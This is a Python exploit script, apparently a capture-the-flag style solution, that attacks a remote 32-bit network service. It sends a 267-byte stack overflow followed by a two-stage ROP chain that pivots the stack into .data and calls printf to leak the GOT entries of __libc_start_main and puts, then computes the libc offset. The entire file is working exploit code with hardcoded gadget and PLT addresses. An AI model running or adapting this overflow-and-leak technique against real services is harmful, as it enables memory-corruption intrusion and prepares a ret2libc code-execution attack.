#!/usr/bin/env python

# Hardcoded to get __libc_start_main and puts runtime addresses.
#   printf excluded as address ended in whitespace "0c".


import argparse
import socket
import struct
import time
import sys
import re


def p(addr):
    return struct.pack('<L', addr)


def expose_addrs(ip, port):

    # Choose the stage1addr >= .data section address 0x0804a018
    stage1addr = 0x0804aa24
    # __libc_start_main@PLT 0x0804838c ==> GOT entry 0x0804a004
    libc_GOT = 0x0804a004
    # puts@plt 0x080483cc ==> GOT entry 0x0804a014
    puts_GOT = 0x0804a014

    # **************************************************************************
    # Connect to remote host and receive the input menu
    # **************************************************************************

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    menu = s.recv(1024)

    # **************************************************************************
    # Answer first question and receive the response
    # **************************************************************************

    s.send("57\n")
    prompt = s.recv(100)

    # **************************************************************************
    # Build then send stage 0 buffer and receive response
    # **************************************************************************

    exploit = []
    # Fill up callee stack
    exploit.append("X"*267)
    # Call scanf to copy stage 1 into ~ .data
    #   scanf address = 0x080483bc
    exploit.append(p(0x080483bc))
    #   Get rid of 2 scanf arguments, gadget 0x8048462L: pop ebx ; pop ebp ;;
    exploit.append(p(0x8048462))
    #   1st arg = 0x08048707, pointer to %s
    exploit.append(p(0x08048707))
    #   2nd arg = stage1addr, pointer into .data
    exploit.append(p(stage1addr))

    # After scanf, use leave to switch to stage 1 just read in
    #   pop .data address into ebp so leave will set esp to stage 1 in .data
    #   use gadget 0x8048463L: pop ebp ;; to pop .data
    exploit.append(p(0x08048463))
    exploit.append(p(stage1addr))
    #   use gadget 0x804836aL: leave ;; to branch to stage 1
    #     key to this is that .data is at a fixed address
    exploit.append(p(0x804836a))
    exploit.append("\n")

    s.send("".join(exploit))
    # Response doesn't send flush so s.recv(70) here hangs
    
    # **************************************************************************
    # Build then send stage 1 buffer
    # **************************************************************************

    exploit = []
    # Stage 0 leave returns here, so this is pop'ed into ebp
    exploit.append("junk")
    # call   80483ac <printf@plt> in main @ 0x804853f
    exploit.append(p(0x0804853f))
    #   arg1 = pointer to format string below
    exploit.append(p(stage1addr + 4*5))
    #   arg2 = address of __libc_start_main GOT pointer
    exploit.append(p(libc_GOT))
    #   arg3 = address of puts GOT pointer
    exploit.append(p(puts_GOT))
    #   arg1 format string
    #   address = stage1addr + (4*5)
    # NOTE: two potential problems:
    #       (1) whitespace in address could terminate string early
    #       (2) if no NULL near address could get lots of data
    exploit.append("===libc===%s===puts===%s\n")

    s.send("".join(exploit))
    answer = s.recv(2512)
    libc_answer = answer[answer.find("===libc===")+10:][0:4]
    puts_answer = answer[answer.find("===puts===")+10:][0:4]
    libc = struct.unpack('<L', libc_answer)[0]
    puts = struct.unpack('<L', puts_answer)[0]
    return(libc, puts)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Display puts libc offset")
    parser.add_argument("ip", help="remote IP address")
    parser.add_argument("port", help="remote port")
    args = parser.parse_args()

    ip = args.ip
    port = int(args.port)
    (libc, puts) = expose_addrs(ip, port)
    print("puts = " + hex(puts))
    print("libc = " + hex(libc))
    print("puts offset = " + hex(puts - libc))
    exit()

